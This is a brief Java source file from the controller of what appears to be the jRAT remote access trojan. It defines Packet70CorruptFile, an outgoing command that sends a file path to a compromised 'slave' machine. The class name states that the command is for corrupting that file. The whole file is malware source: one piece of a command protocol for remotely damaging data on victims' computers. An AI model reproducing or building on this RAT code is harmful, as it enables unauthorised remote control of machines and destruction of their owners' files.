package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet70CorruptFile extends AbstractOutgoingPacket {

	private String file;

	public Packet70CorruptFile(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 70;
	}

}
